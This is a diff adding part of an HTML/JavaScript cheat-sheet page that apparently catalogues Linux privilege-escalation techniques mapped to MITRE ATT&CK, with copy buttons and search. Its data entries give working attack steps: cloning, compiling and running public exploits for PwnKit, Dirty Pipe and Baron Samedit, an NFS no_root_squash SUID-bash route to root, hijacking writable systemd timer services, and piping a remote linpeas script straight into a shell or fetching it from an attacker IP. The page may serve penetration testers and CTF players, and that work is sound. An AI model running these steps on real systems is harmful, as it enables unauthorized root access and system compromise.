+    color: "background:#F1EFE8;color:#5F5E5A",
+    items: [
+      {
+        t: "Kernel version - exploit match",
+        m: "T1068",
+        mName: "Exploitation for Privilege Escalation",
+        desc: "Exact kernel version + distro feeds into searchsploit and exploit-db.",
+        cmds: [
+          { c: "uname -r", o: "5.4.0-42-generic", t: "Exact kernel version to match against published exploits" },
+          { c: "cat /etc/os-release | grep -E '^(NAME|VERSION)='", o: "NAME=\"Ubuntu\"\nVERSION=\"20.04.3 LTS\"", t: "Distro + version for matching patch status" },
+          { c: "cat /proc/version", t: "Full build info including compiler version" }
+        ],
+        hit: "Workflow:\n1. uname -r\n2. On Kali: searchsploit linux kernel VERSION\n3. Google: 'kernel VERSION privilege escalation site:exploit-db.com'\n4. Download PoC, compile on target, run",
+        warn: "Kernel exploits can crash systems. Test in low-traffic windows. CTFs safer than prod."
+      },
+      {
+        t: "PwnKit - CVE-2021-4034",
+        m: "T1068",
+        mName: "Exploitation for Privilege Escalation",
+        desc: "pkexec vulnerability - root with no sudo permissions needed. Pre-2022 = likely vulnerable.",
+        cmds: [
+          { c: "pkexec --version", o: "pkexec version 0.105", t: "Versions < 0.120 potentially vulnerable - patched Jan 2022" },
+          { c: "dpkg -l policykit-1 2>/dev/null | tail -1", t: "Exact package version on Debian/Ubuntu" }
+        ],
+        hit: "PoC: github.com/berdav/CVE-2021-4034\ngit clone URL && cd CVE-2021-4034\nmake && ./cve-2021-4034\n\nOne-liner: github.com/ly4k/PwnKit"
+      },
+      {
+        t: "Dirty Pipe - CVE-2022-0847",
+        m: "T1068",
+        mName: "Exploitation for Privilege Escalation",
+        desc: "Kernel 5.8 to 5.16.10 - overwrite any read-only file including SUID binaries.",
+        cmds: [
+          { c: "uname -r | awk -F'[.-]' '{v=$1\".\"$2\".\"$3; if(v>=\"5.8.0\" && v<=\"5.16.10\") print \"VULNERABLE: \"v; else print \"Patched: \"v}'", t: "Quick version check - if VULNERABLE printed, reliable root path exists" }
+        ],
+        hit: "PoC: github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits\nExploit 1: overwrite /etc/passwd root entry\nExploit 2: inject into SUID binary, /bin/bash -p"
+      },
+      {
+        t: "Baron Samedit - CVE-2021-3156",
+        m: "T1068",
+        mName: "Exploitation for Privilege Escalation",
+        desc: "Heap overflow in sudo - works without any sudo privileges at all.",
+        cmds: [
+          { c: "sudo -V | head -1", o: "Sudo version 1.8.31", t: "Versions < 1.9.5p2 (patched Jan 2021) are vulnerable" },
+          { c: "sudoedit -s / 2>&1 | grep -q 'usage' && echo 'Patched' || echo 'Likely VULNERABLE'", t: "Safe probe - no crash risk" }
+        ],
+        hit: "PoC: github.com/blasty/CVE-2021-3156\nmake\n./sudo-hax-me-a-sandwich 0  # Ubuntu 20.04\n./sudo-hax-me-a-sandwich 1  # Ubuntu 18.04\n./sudo-hax-me-a-sandwich 2  # Debian 10",
+        warn: "Works without ANY sudo permission - only needs a local shell. Even sudo -l returning 'not allowed' users can exploit this."
+      }
+    ]
+  },
+  {
+    sec: "🔎 Recon & Final Checks",
+    icon: "🔎",
+    color: "background:#EAF3DE;color:#3B6D11",
+    items: [
+      {
+        t: "NFS - no_root_squash = instant root",
+        m: "T1068",
+        mName: "Exploitation for Privilege Escalation",
+        desc: "NFS shares with no_root_squash let you create SUID binaries as root from your attacker box.",
+        cmds: [
+          { c: "cat /etc/exports 2>/dev/null", o: "/home/saket *(rw,no_root_squash)", t: "no_root_squash = your root on attacker = root on this share" },
+          { c: "showmount -e 127.0.0.1 2>/dev/null", t: "Enumerate local NFS exports (or target IP from attacker)" }
+        ],
+        hit: "From ATTACKER machine:\nsudo mkdir /mnt/nfs && sudo mount -t nfs TARGET:/share /mnt/nfs\ncd /mnt/nfs\ncp /bin/bash . && sudo chmod +s bash\n\n# Back on TARGET:\n/path/to/share/bash -p"
+      },
+      {
+        t: "Systemd timers - missed cron equivalent",
+        m: "T1053.006",
+        mName: "Systemd Timers",
+        desc: "Systemd timers trigger services on schedule - often overlooked in audits.",
+        cmds: [
+          { c: "systemctl list-timers --all --no-pager 2>/dev/null", o: "NEXT                         UNIT\nSun 2024-04-21 02:00:00 UTC  backup.timer", t: "Shows all timers and their next execution" },
+          { c: "systemctl list-timers --all --no-pager 2>/dev/null | awk 'NR>1{print $NF}' | sort -u | xargs -I{} systemctl cat {} 2>/dev/null", t: "Read every timer definition + the service it triggers" }
+        ],
+        hit: "Timer → Service → writable ExecStart:\n1. List timers\n2. Read triggered service\n3. If ExecStart writable → modify → wait for timer fire"
+      },
+      {
+        t: "linpeas / pspy - automated scanners",
+        m: "T1087",
+        mName: "Account Discovery",
+        desc: "When manual enumeration is exhausted - run automation.",
+        cmds: [
+          { c: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", t: "linpeas - comprehensive privesc scanner. Red/Yellow = critical" },
+          { c: "wget http://YOUR_IP:8000/linpeas.sh && bash linpeas.sh | tee /tmp/linpeas.txt", t: "Save output - large output is hard to scroll in terminal" },
+          { c: "chmod +x pspy64 && ./pspy64", t: "pspy - monitors processes without root. Catches short-lived cron jobs" }
+        ],
+        hit: "linpeas colour guide:\nRED + YELLOW = critical, exploit immediately\nRED = high priority\nGREEN = of interest\n\npspy catches processes that start/stop between ps runs - cron jobs, service restarts",
+        warn: "linpeas makes significant noise in logs and file access patterns. Only use when manual methods fail."
+      },
+      {
+        t: "System info baseline",
+        m: "T1082",
+        mName: "System Information Discovery",
+        desc: "Gather system info for initial context and exploit matching.",
+        cmds: [
+          { c: "uname -a", o: "Linux target 5.4.0-42-generic #46-Ubuntu SMP x86_64", t: "Kernel, arch, build info in one line" },
+          { c: "hostname && cat /etc/hostname", t: "Hostname naming often reveals server role (web, db, dev, prod)" },
+          { c: "cat /etc/os-release", t: "Full distro identification" },
+          { c: "arch", t: "CPU architecture - needed for exploit binary compatibility" }
+        ],
+        hit: "Matching architecture + distro + kernel to public exploits = foundation of kernel LPE"
+      }
+    ]
+  }
+];
+
+const allTerms = [];
+// add section names first so they rank high
+data.forEach(sec => {
+  const cleanName = sec.sec.replace(/^[^\s]+\s/, '');
+  allTerms.push({ text: cleanName, type: 'section', sec: sec.sec, action: 'jump' });
+});
+data.forEach(sec => {
+  sec.items.forEach(item => {
+    allTerms.push({ text: item.t, type: 'technique', sec: sec.sec });
+    allTerms.push({ text: item.m, type: 'mitre', sec: sec.sec });
+  });
+});
+['sudo','SUID','capabilities','cron','kernel','container','NFS','PATH','docker','SSH','credentials','lateral','discovery','kerberos','pkexec','PwnKit','privilege','hijack','recon','escape','timer','writable','history','environment','wildcard','kernel exploit'].forEach(t => {
+  allTerms.push({ text: t, type: 'keyword' });
+});
+
+let lastRenderTotal = 0;
+
+function fuzzyMatch(q, text) {
+  let i = 0;
+  for (let c of text.toLowerCase()) {
+    if (c === q[i]) i++;
+    if (i === q.length) return true;
+  }
+  return false;
+}
+
+function render() {
+  cmdStore.length = 0;
+  const q = document.getElementById('search').value.toLowerCase().trim();
+  const out = document.getElementById('out');
+  let html = '';
+  let total = 0;
+  let sectionCount = 0;
+
+  data.forEach(sec => {
+    const items = sec.items.filter(i => {
+      if (!q) return true;
+      const hay = (i.t + ' ' + i.m + ' ' + (i.mName||'') + ' ' + (i.desc||'') + ' ' +
+                   i.cmds.map(c => c.c + ' ' + (c.t||'')).join(' ') + ' ' + sec.sec).toLowerCase();
+      return hay.includes(q) || fuzzyMatch(q, hay);
+    });
+
+    if (!items.length) return;
+    sectionCount++;
+    total += items.length;
+
+    html += '<div class="sec"><div class="sec-hd">'
+      + '<div class="sec-icon" style="' + sec.color + '">' + sec.icon + '</div>'
+      + '<span class="sec-ttl">' + sec.sec.replace(/^[^\s]+\s/, '') + '</span>'
+      + '<span class="sec-cnt">' + items.length + ' technique' + (items.length !== 1 ? 's' : '') + '</span>'
+      + '</div><div class="grid">';
+
+    items.forEach((item, idx) => {
+      const cardId = sec.sec.replace(/\s/g, '_') + '_' + idx;
+      let cmdHtml = '';
+      item.cmds.forEach(e => {
+        const ci = cmdStore.length;
+        cmdStore.push(e.c);
+        cmdHtml += '<div class="eb"><div class="eb-top">'
+          + '<div class="ec"><span class="prompt">$</span> ' + esc(e.c) + '</div>'
+          + '<button class="copy-btn" onclick="event.stopPropagation();copyCmd(this,' + ci + ')">copy</button>'
+          + '</div>'
+          + (e.o ? '<div class="eo">' + esc(e.o) + '</div>' : '')
+          + (e.t ? '<div class="en">' + e.t + '</div>' : '')
+          + '</div>';
+      });
+
+      html += '<div class="card' + (item.priority ? ' card-pri' : '') + '" onclick="this.classList.toggle(\'open\')">'
+        + '<div class="ch">'
+        + '<span class="cn">' + item.t + '</span>'
+        + '<span class="mitre" title="' + (item.mName||'') + '">' + item.m + '</span>'
+        + '<span class="arr">▼</span>'
+        + '</div>'
+        + (item.desc ? '<div class="desc">' + item.desc + '</div>' : '')
+        + '<div class="body">'
+        + cmdHtml
+        + (item.hit ? '<div class="hit"><b>If you get a hit</b><pre>' + esc(item.hit) + '</pre></div>' : '')
+        + (item.warn ? '<div class="warn"><b>Watch out:</b> ' + esc(item.warn) + '</div>' : '')
+        + '</div></div>';
+    });
+
+    html += '</div></div>';
+  });
+
+  if (!total) {
+    html = '<div class="nr">No techniques found for "<b>' + esc(q) + '</b>"</div>';
+  }
+
+  out.innerHTML = html;
+  lastRenderTotal = total;
+
+  const stats = document.getElementById('stats');
+  if (!q) {
+    let totalCmds = 0;
+    data.forEach(s => s.items.forEach(i => totalCmds += i.cmds.length));
+    stats.innerHTML = '<span class="stat-pill">' + data.length + ' categories</span>'
+      + '<span class="stat-pill">' + data.reduce((a,s) => a+s.items.length, 0) + ' techniques</span>'
+      + '<span class="stat-pill">' + totalCmds + ' commands</span>'
+      + '<span class="stat-pill">MITRE ATT&amp;CK mapped</span>';
+  } else {
+    stats.innerHTML = '<span class="stat-pill">' + total + ' matches across ' + sectionCount + ' section' + (sectionCount !== 1 ? 's' : '') + '</span>';
+  }
+}
+
+// score matches: prefix match > word-start match > fuzzy match
+function scoreMatch(query, text) {
+  const q = query.toLowerCase();
+  const t = text.toLowerCase();
+  if (t === q) return 1000;
+  if (t.startsWith(q)) return 500;
+  // word-start match: any word in the text starts with the query
+  const words = t.split(/[\s\-\/]+/);
+  for (const w of words) {
+    if (w.startsWith(q)) return 300;
+  }
+  if (t.includes(q)) return 150;
+  if (fuzzyMatch(q, t)) return 50;
+  return 0;
+}
+
+document.getElementById('search').addEventListener('input', function() {
+  const q = this.value.toLowerCase().trim();
+  const box = document.getElementById('suggestions');
+
+  if (!q) { box.style.display = 'none'; render(); return; }
+
+  const seen = new Set();
+  const scored = [];
+  allTerms.forEach(t => {
+    const key = t.text.toLowerCase();
+    if (seen.has(key)) return;
+    const score = scoreMatch(q, t.text);
+    if (score > 0) {
+      seen.add(key);
+      // boost section results so they show up first
+      const boost = t.type === 'section' ? 100 : (t.type === 'mitre' ? 50 : 0);
+      scored.push({ ...t, score: score + boost });
+    }
+  });
+
+  scored.sort((a, b) => b.score - a.score);
+  const matches = scored.slice(0, 8);
+
+  if (!matches.length) { box.style.display = 'none'; render(); return; }
+
+  box.innerHTML = matches.map(m =>
+    '<div class="suggestion" data-val="' + esc(m.text) + '" data-type="' + m.type + '" data-sec="' + esc(m.sec || '') + '">' +
+    esc(m.text) + '<span class="sug-tag">' + m.type + '</span></div>'
+  ).join('');
+  box.style.display = 'block';
+
+  document.querySelectorAll('.suggestion').forEach(el => {
+    el.onclick = () => {
+      const val = el.dataset.val;
+      const type = el.dataset.type;
+      const sec = el.dataset.sec;
+
+      document.getElementById('search').value = val;
+      box.style.display = 'none';
+      render();
+
+      // if it's a section suggestion, scroll to that section and open its first card
+      if (type === 'section' && sec) {
+        setTimeout(() => {
+          // find the matching section header by text content
+          const headers = document.querySelectorAll('.sec-ttl');
+          for (const h of headers) {
+            if (h.textContent.trim() === val) {
+              h.closest('.sec').scrollIntoView({ behavior: 'smooth', block: 'start' });
+              break;
+            }
+          }
+        }, 50);
+      }
+    };
+  });
+
+  render();
+});
+
+document.addEventListener('click', e => {
+  if (!e.target.closest('.search-wrap')) {
+    document.getElementById('suggestions').style.display = 'none';
+  }
+});
+
+render();
+</script>
+</body>
+</html>
